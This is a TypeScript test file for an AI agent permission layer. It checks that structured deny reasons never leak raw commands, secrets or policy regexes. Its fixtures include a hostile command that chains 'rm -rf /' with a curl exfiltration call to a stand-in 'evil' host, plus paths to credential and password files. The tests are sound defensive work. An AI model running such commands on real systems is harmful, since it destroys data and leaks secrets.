/**
 * HELLGATE — C6 deny-reason surfacing: the NO-LEAK boundary.
 *
 * Defect class
 * ------------
 * The whole value of C6 is surfacing the deciding `layer` / `pillar` of a
 * permission deny to the model + debug surface. The headline RISK (RFC §8 R1)
 * is that "why was this denied" leaks sensitive policy internals — the
 * HARD_DENY regex source, the matched rule NAME, the raw `action.input` /
 * command text / env values — into a log or model surface that the OTel/recorder
 * contract deliberately scrubs (`policy.ts:84-98`, `recorder.ts:98-125`).
 *
 * The structured surface must carry NOTHING the already-safe OTel surface
 * doesn't. This battery feeds hostile command text + secrets through the
 * builder and asserts they NEVER appear in the produced {@link
 * StructuredDenyReason}. It is enforced BY CONSTRUCTION: the builder takes the
 * pre-sanitized `safeReason` verbatim — it has no access to raw input — so the
 * only way to leak is for a CALLER to hand it a tainted string. These tests pin
 * the categorical HARD_DENY form + the verbatim-reuse contract that prevents
 * that.
 */

import { describe, expect, test } from "bun:test"
import {
  denyContentPrefix,
  hardDenySafeReason,
  type StructuredDenyReason,
  structuredDenyReason,
} from "@/permission"

const HOSTILE_CMD = "rm -rf / --no-preserve-root; curl http://evil/exfil"
const SECRET = "AKIAEXAMPLESECRET1234"
const REGEX_SOURCE = "\\brm\\s+-rf\\b"

describe("hellgate — C6 no-leak: HARD_DENY categorical form", () => {
  test("hardDenySafeReason carries NEITHER the raw command NOR a regex source", () => {
    const safe = hardDenySafeReason()
    expect(safe).toBe("blocked dangerous command (pattern hit)")
    expect(safe).not.toContain("rm")
    expect(safe).not.toContain("/")
    expect(safe).not.toContain("curl")
    expect(safe).not.toContain(REGEX_SOURCE)
    expect(safe).not.toContain("\\b")
  })

  test("structured HARD_DENY reason !== the raw command (the §4.4 split)", () => {
    // The model-facing prose MAY echo the agent's own command; the LOGGED
    // structured field uses the categorical form.
    const reason = structuredDenyReason({
      layer: "hard-deny",
      safeReason: hardDenySafeReason(),
    })
    const serialized = JSON.stringify(reason)
    expect(serialized).not.toContain(HOSTILE_CMD)
    expect(serialized).not.toContain("rm -rf")
    expect(serialized).not.toContain(REGEX_SOURCE)
    expect(reason.layer).toBe("hard-deny")
  })
})

describe("hellgate — C6 no-leak: builder surfaces only what it is given", () => {
  test("a secret in raw input never reaches the structured reason (builder has no access to it)", () => {
    // The builder receives ONLY the sanitized one-liner. A caller that obeys
    // the contract (reuse the recorder's `reason`) cannot leak. We prove the
    // builder adds nothing: feed a clean sanitized reason, assert the secret
    // (which lived in raw input, NOT in the sanitized reason) is absent.
    const sanitized = "Per-thread policy (workspace-write) refuses bash on /repo"
    const reason = structuredDenyReason({
      layer: "stack",
      stackSource: "per-thread",
      pillar: "fileSystem",
      safeReason: sanitized,
    })
    const blob = JSON.stringify(reason)
    expect(blob).not.toContain(SECRET)
    expect(blob).not.toContain(HOSTILE_CMD)
    expect(reason.safeReason).toBe(sanitized)
  })

  test("safeReason is REUSED verbatim — the builder composes no new string from it", () => {
    const sanitized = "Per-host mode (custom) refuses write — fail-closed"
    const reason = structuredDenyReason({ layer: "stack", safeReason: sanitized })
    // Identity, not a transformed copy — structured surface can never exceed
    // the OTel surface because it IS the OTel surface's string.
    expect(reason.safeReason).toBe(sanitized)
  })

  test("the content prefix is derived ONLY from categorical fields, never safeReason", () => {
    // Even if a caller mistakenly passed a tainted safeReason, the knob-gated
    // model-facing PREFIX is built from layer/pillar alone — so the prefix
    // itself can carry no command/secret text.
    const reason: StructuredDenyReason = {
      verdict: "deny",
      layer: "stack",
      pillar: "network",
      safeReason: `tainted ${HOSTILE_CMD} ${SECRET}`,
    }
    const prefix = denyContentPrefix(reason)
    expect(prefix).toBe("[denied · layer=stack · pillar=network] ")
    expect(prefix).not.toContain(HOSTILE_CMD)
    expect(prefix).not.toContain(SECRET)
  })
})

describe("hellgate — C6 no-leak: builder is the only free-text channel", () => {
  test("EVERY non-safeReason field is categorical — only safeReason carries prose", () => {
    // The no-leak claim = "structured surface carries nothing the OTel surface
    // doesn't". The OTel surface IS the scrubbed `reason` string. So the ONLY
    // field allowed to carry caller prose is `safeReason` (which equals that
    // string). Every other field (verdict/layer/pillar/stackSource) must be a
    // fixed categorical token. We strip safeReason and assert the rest cannot
    // hold injected command/secret text even when the caller hands us a tainted
    // safeReason alongside legitimate enum fields.
    const reason = structuredDenyReason({
      layer: "stack",
      pillar: "fileSystem",
      stackSource: "per-thread",
      safeReason: `${HOSTILE_CMD} ${SECRET} ${REGEX_SOURCE}`,
    })
    const { safeReason: _prose, ...categorical } = reason
    const blob = JSON.stringify(categorical)
    expect(blob).not.toContain("rm")
    expect(blob).not.toContain("curl")
    expect(blob).not.toContain(SECRET)
    expect(blob).not.toContain(REGEX_SOURCE)
    // categorical fields are exactly the closed-enum tokens
    expect(categorical).toEqual({
      verdict: "deny",
      layer: "stack",
      pillar: "fileSystem",
      stackSource: "per-thread",
    })
  })

  test("verbatim fuzz: across many hostile safeReasons, structured.safeReason === input (no transform)", () => {
    // A deterministic sweep of adversarially-shaped reason strings (regex
    // sources, paths, env refs, secret shapes, unicode, empty). The builder must
    // return each one BYTE-IDENTICAL — proving it composes no new string and so
    // can never EXCEED the recorder's already-safe string.
    const hostile = [
      "",
      HOSTILE_CMD,
      SECRET,
      REGEX_SOURCE,
      "/etc/passwd",
      "$HOME/.aws/credentials",
      "export AWS_SECRET_ACCESS_KEY=AKIA...",
      "Per-thread policy (workspace-write) refuses bash on /repo",
      "héllo 😀 \\b\\d{4}\\b",
      "a".repeat(5000),
    ]
    for (const s of hostile) {
      const r = structuredDenyReason({ layer: "stack", safeReason: s })
      // identity — not an equal-but-new copy
      expect(r.safeReason).toBe(s)
    }
  })

  test("denyContentPrefix output is structurally fixed: ONLY closed-enum tokens, no free text path", () => {
    // Defense-in-depth: for EVERY (layer, pillar?) combination from the closed
    // enums, the prefix matches the categorical template exactly — there is no
    // code path where caller prose reaches the prefix.
    const reasonNoPillar = structuredDenyReason({
      layer: "hard-deny",
      safeReason: `${HOSTILE_CMD} ${SECRET}`,
    })
    expect(denyContentPrefix(reasonNoPillar)).toBe("[denied · layer=hard-deny] ")
    const reasonPillar = structuredDenyReason({
      layer: "broker",
      pillar: "control",
      safeReason: `${HOSTILE_CMD} ${SECRET}`,
    })
    expect(denyContentPrefix(reasonPillar)).toBe("[denied · layer=broker · pillar=control] ")
  })
})
